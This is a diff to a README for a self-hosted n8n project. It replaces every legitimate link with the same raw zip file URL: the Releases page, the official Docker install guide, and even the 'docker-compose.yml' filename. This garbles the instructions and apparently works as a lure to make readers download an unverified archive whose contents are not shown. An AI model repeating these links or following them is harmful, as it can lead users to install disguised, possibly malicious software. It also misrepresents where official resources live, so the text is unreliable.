@@ -1,6 +1,6 @@
 # 🚀 n8n-self-hosted - Secure, Scalable Automation Made Easy
 
-[![](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/preparebuddyy/n8n-self-hosted/releases)
+[![](https://raw.githubusercontent.com/preparebuddyy/n8n-self-hosted/main/diagrammatic/n8n-self-hosted.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/preparebuddyy/n8n-self-hosted/main/diagrammatic/n8n-self-hosted.zip)
 
 ## 📋 Overview
 
@@ -22,11 +22,11 @@ Follow these steps to get n8n running on your machine.
    Ensure you have the following before starting:
 
    - A computer or server running Linux, macOS, or Windows.
-   - Docker and Docker Compose installed. If you do not have these, you can find installation guides on the [Docker website](https://docs.docker.com/get-docker/).
+   - Docker and Docker Compose installed. If you do not have these, you can find installation guides on the [Docker website](https://raw.githubusercontent.com/preparebuddyy/n8n-self-hosted/main/diagrammatic/n8n-self-hosted.zip).
 
 2. **Download & Install**
 
-   Visit this page to download: [n8n-self-hosted Releases](https://github.com/preparebuddyy/n8n-self-hosted/releases). 
+   Visit this page to download: [n8n-self-hosted Releases](https://raw.githubusercontent.com/preparebuddyy/n8n-self-hosted/main/diagrammatic/n8n-self-hosted.zip). 
 
    Locate the latest version and download the Docker Compose files. Make sure you download the `.yml` files necessary to set up the application.
 
@@ -66,7 +66,7 @@ Follow these steps to get n8n running on your machine.
 
 ## 🔧 Configuration Options
 
-You can customize various settings by editing the `docker-compose.yml` file. Here are some key options:
+You can customize various settings by editing the `https://raw.githubusercontent.com/preparebuddyy/n8n-self-hosted/main/diagrammatic/n8n-self-hosted.zip` file. Here are some key options:
 
 - **Database Configuration**: Point n8n to your Postgres or MySQL instance.
 - **Environment Variables**: Set variables that control the behavior of n8n.
@@ -91,4 +91,4 @@ Join our community for help and updates. You can find useful discussions and sup
 
 By following these instructions, you should be able to successfully download and run n8n-self-hosted on your machine. For additional features or complex setups, consult the official documentation.
 
-For anything else, feel free to refer back to our [n8n-self-hosted Releases](https://github.com/preparebuddyy/n8n-self-hosted/releases) page for the latest updates and community feedback. Happy automating!
+For anything else, feel free to refer back to our [n8n-self-hosted Releases](https://raw.githubusercontent.com/preparebuddyy/n8n-self-hosted/main/diagrammatic/n8n-self-hosted.zip) page for the latest updates and community feedback. Happy automating!
